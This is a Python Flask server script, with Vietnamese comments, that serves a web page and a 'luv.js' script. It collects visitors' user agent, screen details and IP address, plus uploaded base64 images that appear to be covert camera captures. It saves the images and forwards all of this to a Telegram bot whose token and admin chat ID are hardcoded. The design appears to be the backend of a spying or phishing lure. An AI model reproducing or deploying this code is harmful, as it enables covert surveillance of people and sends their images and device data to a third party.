from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime
import os
from io import BytesIO
import base64
import requests
from threading import Thread

# =============================
# APP CONFIG (SAME DIRECTORY)
# =============================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

app = Flask(
    __name__,
    template_folder=BASE_DIR,   # index.html cùng cấp
    static_folder=BASE_DIR      # luv.js, style.css cùng cấp
)

UPLOAD_FOLDER = os.path.join(BASE_DIR, 'picture')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# =============================
# TELEGRAM CONFIG
# =============================
TELEGRAM_BOT_TOKEN = "7573835095:AAFbQUwn-nLyAXwFKhb3Fotpp8C-pGcU_O4"
TELEGRAM_ADMIN_ID = "6723063227"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

# =============================
# TELEGRAM SEND
# =============================
def send_to_telegram(image_bytes, filename):
    try:
        files = {
            'photo': (filename, BytesIO(image_bytes), 'image/png')
        }
        data = {
            'chat_id': TELEGRAM_ADMIN_ID,
            'caption': '📸 New Picture'
        }
        requests.post(
            f'{TELEGRAM_API_URL}/sendPhoto',
            files=files,
            data=data,
            timeout=10
        )
    except Exception as e:
        print("Telegram error:", e)

# =============================
# ROUTES
# =============================
@app.route('/')
def index():
    # index.html cùng cấp app.py
    return send_from_directory(BASE_DIR, 'index.html')

@app.route('/luv.js')
def serve_js():
    return send_from_directory(BASE_DIR, 'luv.js')

@app.route('/style.css')
def serve_css():
    return send_from_directory(BASE_DIR, 'style.css')

@app.route('/log_user_agent', methods=['POST'])
def log_user_agent():
    try:
        data = request.json or {}

        ua = data.get('user_agent', 'unknown')
        platform = data.get('platform', '')
        screen = data.get('screen', '')
        dpr = data.get('dpr', '')

        message = (
            "<blockquote>"
            "📱 <b>User Agent Detected</b>\n\n"
            f"🧠 <b>UA:</b>\n<code>{ua}</code>\n\n"
            f"💻 <b>Platform:</b> {platform}\n"
            f"🖥 <b>Screen:</b> {screen}\n"
            f"🔍 <b>DPR:</b> {dpr}\n"
            f"🌐 <b>IP:</b> {request.remote_addr}"
            "</blockquote>"
        )

        requests.post(
            f"{TELEGRAM_API_URL}/sendMessage",
            data={
                "chat_id": TELEGRAM_ADMIN_ID,
                "text": message,
                "parse_mode": "HTML"
            },
            timeout=10
        )

        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/save_image', methods=['POST'])
def save_image():
    try:
        data = request.json
        image_data = data.get('image')

        if not image_data:
            return jsonify({'success': False, 'message': 'No image data'}), 400

        if image_data.startswith('data:image'):
            image_data = image_data.split(',')[1]

        image_bytes = base64.b64decode(image_data)

        filename = f"miss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        filepath = os.path.join(UPLOAD_FOLDER, filename)

        # Lưu ảnh (tuỳ chọn)
        with open(filepath, 'wb') as f:
            f.write(image_bytes)

        Thread(
            target=send_to_telegram,
            args=(image_bytes, filename),
            daemon=True
        ).start()

        return jsonify({'success': True})

    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

# =============================
# RUN
# =============================
if __name__ == '__main__':
    app.run(debug=False)
